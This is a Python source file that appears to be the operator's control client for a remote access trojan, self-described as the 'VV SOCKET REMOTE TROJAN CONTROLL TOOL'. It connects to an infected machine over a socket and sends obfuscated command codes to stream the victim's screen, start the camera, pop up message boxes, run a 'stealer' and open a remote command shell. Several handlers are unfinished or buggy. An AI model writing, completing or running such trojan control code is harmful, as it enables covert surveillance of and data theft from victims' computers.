import socket
import os
import numpy as np
import random
import time
import threading
import cv2
import struct
import pickle
from PIL import Image
import matplotlib.pyplot as plt
import keyboard

#import pystyle

#client
#version 1.5
#made by kc

def receive_all(conn, length):
    data = b''
    while len(data) < length:
        packet = conn.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data

def receive_screenshot(conn):
    length = int.from_bytes(conn.recv(4), byteorder='big')
    img_data = receive_all(conn, length)
    if img_data is None:
        return None
    img_array = np.frombuffer(img_data, dtype=np.uint8)
    frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
    return frame

def live_screen(conn):
    while True:
        frame = receive_screenshot(conn)
        if frame is not None:
            cv2.imshow('Live Screen', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
    cv2.destroyAllWindows()

print("Welcome To VV SOCKET REMOTE TROJAN CONTROLL TOOL")

VADR =  "192.168.0.3"
VPRT =  552

vsc =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	vsc.connect((VADR,VPRT))
except:
	print("CONNECTION ERROR!")
	time.sleep(2)
	#exit()

constatus = "ONLINE [OK!]"
serveracceptmsg  = vsc.recv(1024)
print(serveracceptmsg.decode())

status = """
        [-------------------------]
        [ Status: {}    ]
        [                         ]
        [ /help for more commands ]
        [                         ]
        [                         ]
        [ Version: 1.1            ]
        [                         ]
        [ Made By KC              ]
        [-------------------------]
""".format(constatus)

vv_banner = """

    VV         VV      VV         VV
     VV       VV        VV       VV
      VV     VV          VV     VV
       VV   VV            VV   VV
        VV VV              VV VV
         VwV                VwV



"""


commandlist = """

[---------------------------------]
.
.
.
.
.  $live screen
.
.  $live camera
.
.  $use msgbox
.  
.  $use bg
.
.  $stealer
.
.  $cmd
.
.
.
.
.
.
.
.
. Version 1.2
[---------------------------------]

"""

print(vv_banner)
print(status)


def commandcaller(getcom):

  if getcom == "/help":
    print(commandlist)

  elif getcom == "$live screen":
    callcontent = "xWERxq2312fttl_qrs"
    vsc.send(callcontent.encode())
    vsc.recv(1024)
    fpsa = input("Fps->")
    try:
      fps = int(fpsa)
    except:
      print("Wrong Value Using Default. ->   25 FPS")
      fps = "25"

    finally:
      fps = str(fpsa)


    if fps is None:
      print("Wrong Value Using Default. ->   25 FPS")
      fps = "25"

    vsc.send(fps.encode())
    info_msg = vsc.recv(1024).decode()
    print(info_msg)
    live_screen(vsc)



  elif getcom == "$":
     pass


  elif getcom == "$live camera":
    callcontent = "SwlsoxQqx_svch_fsx"
    vsc.send(callcontent.encode())

  elif getcom == "$use msgbox":
    callcontent = "ftqwrxzLpssmtrnszx_pxvbq"
    vsc.send(callcontent.encode())
    vsc.recv(1024)
    boxTitlede = input("<Title-> ")
    vsc.send(boxTitlede.encode())
    vsc.recv(1024)
    boxContentde = input("<Content->  ")
    vsc.send(boxContentde.encode())
    cmoutput = vsc.recv(1024)
    outpt = cmoutput.decode()
    print("Command Output\n\n{}".format(outpt))

  elif getcom == ".clear":
    os.system("cls")
    print(vv_banner)

  elif getcom == "$cmd":
    vsc.send("xvkso_Qwxksexvzz")
    

  elif getcom == "$exit":
    yn = input("Are you sure?(Y/N) ")

    if yn == "Y" or yn == "y":
      vsc.close()
      exit()

    elif yn == "N" or yn == "n":
      pass

    else:
      pass

  else:
    print("WRONG COMMAND!")

while True:
  commandline = input("$Command-> ")
  commandcaller(commandline)

